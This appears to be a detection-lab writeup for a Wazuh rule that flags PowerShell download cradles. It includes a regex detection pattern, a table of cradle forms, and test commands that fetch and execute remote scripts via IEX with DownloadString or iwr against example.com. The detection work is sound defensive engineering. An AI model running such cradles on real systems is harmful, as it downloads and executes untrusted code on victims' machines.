# 100290 — PowerShell download cradle

| Field | Value |
|---|---|
| Rule ID | 100290 |
| Level | 13 |
| MITRE technique | [T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/), [T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/) |
| Tactic | TA0011 Command & Control / TA0002 Execution |
| Parent rule | 92052 (Sysmon EventID 1 — process create) |
| Telemetry | Sysmon `Microsoft-Windows-Sysmon/Operational` |
| Status | 🟡 Process-create event recorded and rule fires on the attempt; the cradle itself is blocked by Defender ASR. Full payload-fetch validation awaits the Range VM. |

## Detection logic

```xml
<rule id="100290" level="13">
  <if_sid>92052</if_sid>
  <field name="win.eventdata.image" type="pcre2">(?i)\\powershell(_ise)?\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(iex|invoke-expression).{0,80}(new-object.{0,40}(net\.webclient|system\.net\.webclient)|invoke-webrequest|iwr|wget|curl|downloadstring|downloaddata|downloadfile)</field>
  <description>PowerShell download cradle.</description>
  <mitre><id>T1105</id><id>T1059.001</id></mitre>
</rule>
```

The regex hunts for the **`IEX (...download...)` pattern** in any of its common shapes:

| Form | Why it matches |
|---|---|
| `IEX (New-Object Net.WebClient).DownloadString('http://...')` | Classic empire/PSEmpire pattern |
| `Invoke-Expression (Invoke-WebRequest http://...).Content` | Modern PS5+ equivalent |
| `iex (iwr http://...)` | Same, abbreviated |
| `IEX (wget http://...)` | PowerShell alias for Invoke-WebRequest |
| `IEX (curl http://...)` | Same |
| `IEX (...DownloadFile(...))` | File-to-disk variant |

The `.{0,80}` bridge between `IEX` and the download verb tolerates whitespace, parentheses, type accelerators, and variable indirection without being so loose it false-positives.

## Test methodology

```powershell
# Canonical cradle test (Defender will block the IEX of fetched content;
# Sysmon still records the process-create with the full command line)
IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')

# Modern variant
IEX (iwr http://example.com/test.ps1).Content
```

## Observed status

🟡 **Partial.** On Freddy-PC, Defender ASR rule `d1e49aac-8f56-4280-b9ba-993a6d77406c` (Block process creations originating from PSExec and WMI commands) and AMSI in-memory script blocking preempt the full execution.

What does happen:

1. Sysmon EventID 1 IS emitted for the powershell.exe process-create with the full command line preserved
2. Stock 92052 fires
3. Custom 100290 fires (alert recorded in `alerts.json` at level 13)
4. The IEX of the downloaded content is then blocked by AMSI / ASR before the payload runs

So the *detection* validates end-to-end; what cannot be validated on Freddy-PC is the post-detection payload behaviour (which would be the input to additional rules like 100210 if the payload itself uses encoded commands).

Confirmed firing 2025-12. Screenshot in `screenshots/100290-firing.png`.

## Tuning notes

- **AMSI logs** — Wazuh can ingest the `Microsoft-Windows-PowerShell/Operational` channel (EventID 4104, script-block logging) which captures the *decoded* payload after AMSI sees it. That channel is currently NOT in the agent config; adding it is in [`../docs/roadmap.md`](../docs/roadmap.md). With 4104 ingested, this rule would have a much stronger sister rule that fires on the *content* not the *command-line shape*
- **False positives** — IT operators sometimes use `iwr` for legitimate scripted downloads. The `IEX (...)` anchor is the safety net: a benign `iwr http://... -OutFile x.zip` doesn't match because there's no IEX. The rule only fires when the *output of the download is being executed*, which is the actual attack pattern
- **Encoded download cradles** stack with 100210 — see that rule's writeup

## Cross-references

- [`100210-ps-encoded.md`](./100210-ps-encoded.md) — companion for the encoded-payload variant
- [`100250-lolbin-abuse.md`](./100250-lolbin-abuse.md) — covers the non-PowerShell download paths (certutil, bitsadmin, etc.)
- [`../docs/findings.md`](../docs/findings.md) — Defender ASR effect on testing
- [`../docs/roadmap.md`](../docs/roadmap.md) — PowerShell 4104 script-block logging
